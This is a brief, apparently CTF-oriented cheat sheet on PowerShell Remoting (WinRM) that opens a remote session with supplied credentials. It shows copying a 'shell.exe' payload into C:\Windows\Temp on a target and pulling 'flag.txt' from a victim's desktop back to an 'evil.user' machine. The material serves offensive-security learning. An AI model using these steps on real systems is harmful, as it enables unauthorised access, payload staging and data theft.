# WinRM (PowerShell Remoting)

Port 5985 (Unencrypted)
Port 5986 (Encrypted)

### 1) Open a PSSession on the target host

    $computerName = 'computer_name_here' # Kerberos requires a FQDN, NTLM uses IP address
    $credential = Get-Credential # Username and password used to log onto the target
    $psSessionParameters = @{
      ComputerName = $computerName
      Credential = $credential
      Authentication = 'Kerberos' # For NTLM use Default
    }
    $session = New-PSSession @psSessionParameters

### 2) Copy a file to the remote session

For example:

Copy the file shell.exe to the target. The target directory will be C:\Windows\Temp in this example

    Copy-Item "C:\Users\evil.user\Desktop\shell.exe" "C:\Windows\Temp" -ToSession $session

### 3) Copy a file from the remote session

For example:

Copy the file flag.txt from the target back to C:\Users\evil.users\Desktop

    Copy-Item "C:\Users\jane.doe\Desktop\flag.txt" "C:\Users\evil.user\Desktop" -FromSession $session
